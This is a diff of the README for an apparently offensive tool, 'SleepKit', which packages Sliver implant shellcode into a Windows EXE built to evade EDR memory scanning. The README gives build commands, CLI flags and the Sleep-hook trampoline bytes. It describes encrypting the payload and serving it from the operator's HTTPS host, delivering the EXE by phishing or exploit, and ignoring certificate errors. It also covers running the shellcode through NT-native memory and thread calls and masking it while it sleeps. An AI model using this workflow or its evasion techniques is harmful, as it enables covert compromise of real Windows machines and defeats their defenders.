@@ -57,7 +57,7 @@ An EDR that scans memory during the sleep window sees: no shellcode, no executab
 | **Hook layer** | `kernel32!Sleep` JMP patch with KernelBase bypass |
 | **Timer layer** | Goroutine-driven XOR cycle |
 | **No RWX** | RW → copy shellcode → RX before execution |
-| **XOR at rest** | Shellcode stored XOR-encrypted in EXE until executed |
+| **ChaCha20-Poly1305 in transit** | payload.enc is ChaCha20-Poly1305 encrypted (not XOR); XOR masking applies only in-memory during sleep |
 | **HTTPS staging** | Self-signed ECDSA cert, randomized URL, one-shot server |
 | **NT-native thread** | `NtCreateThreadEx` for shellcode thread |
 
@@ -65,7 +65,7 @@ An EDR that scans memory during the sleep window sees: no shellcode, no executab
 
 ## Prerequisites
 
-- **Go 1.21+** at `/home/kali/Projects/CVE/toolchain/go/bin/go`
+- **Go 1.21+**: `go version`
 - **Windows x64** target with an active Sliver listener
 
 ---
@@ -75,8 +75,7 @@ An EDR that scans memory during the sleep window sees: no shellcode, no executab
 ### 1. Build the operator CLI
 
 ```bash
-cd /home/kali/sleepkit
-/home/kali/Projects/CVE/toolchain/go/bin/go build -o sleepkit ./cmd/sleepkit
+go build -o sleepkit ./cmd/sleepkit
 ```
 
 Or with garble:
@@ -108,7 +107,7 @@ sliver > generate --format shellcode --os windows --arch amd64 --save implant.bi
 ```
 
 **What this does:**
-- XOR-encrypts the shellcode with a random 32-byte key
+- ChaCha20-Poly1305 encrypts the shellcode with a random key+nonce (written to payload.enc)
 - Cross-compiles a Windows EXE (`build/mask.exe`) with the key and URL embedded
 - Starts a one-shot HTTPS server at the URL you specified
 
@@ -120,7 +119,6 @@ sliver > generate --format shellcode --os windows --arch amd64 --save implant.bi
 
 **Output:**
 ```
-[*] Shellcode: 589824 bytes
 [+] Encrypted → build/payload.enc
 [+] EXE       → build/mask.exe
 [*] Serving on https://0.0.0.0:8443/p ...
@@ -131,7 +129,7 @@ sliver > generate --format shellcode --os windows --arch amd64 --save implant.bi
 Via phishing, exploit, script execution, etc. When `mask.exe` runs on a Windows x64 target:
 
 1. Fetches `payload.enc` over HTTPS (ignores self-signed cert errors)
-2. XOR-decrypts into a fresh `NtAllocateVirtualMemory` RW allocation
+2. ChaCha20-Poly1305 decrypts into a fresh `NtAllocateVirtualMemory` RW allocation
 3. Marks it RX (`NtProtectVirtualMemory`)
 4. Installs the `kernel32!Sleep` hook
 5. Starts the timer goroutine (XOR cycle every `--sleep` interval)
@@ -156,10 +154,11 @@ Build the sleep-masked EXE. Main workflow command.
 Flags:
   --shellcode string   path to Sliver shellcode .bin (required)
   --url string         HTTPS URL to fetch the payload from (required)
-                       format: https://<operator-ip>:<port>/<path>
+                       format: https://<operator-ip>:<port>
+                       only the scheme and host:port are used when --serve is given; the path is auto-generated
   --sleep duration     masking interval (default: 30s)
   --serve              start one-shot HTTPS server after building
-  --port int           server port if --serve (default parsed from --url)
+  --port int           server port if --serve (default: 8443)
   -o, --output string  output directory (default: build)
   --garble             compile with garble symbol/string obfuscation
 ```
@@ -184,11 +183,12 @@ Flags:
 
 ### Hook Layer: kernel32!Sleep
 
-SleepKit patches the first 12 bytes of `kernel32!Sleep` with a `JMP [RIP+0]` trampoline:
+SleepKit patches the first 12 bytes of `kernel32!Sleep` with a `MOV RAX, imm64; JMP RAX` trampoline:
 
 ```
-FF 25 00 00 00 00    JMP QWORD PTR [RIP+0]
+48 B8                REX.W MOV RAX, imm64
 XX XX XX XX XX XX XX XX  ← 8-byte absolute address of hook function
+FF E0                JMP RAX
 ```
 
 The hook function:
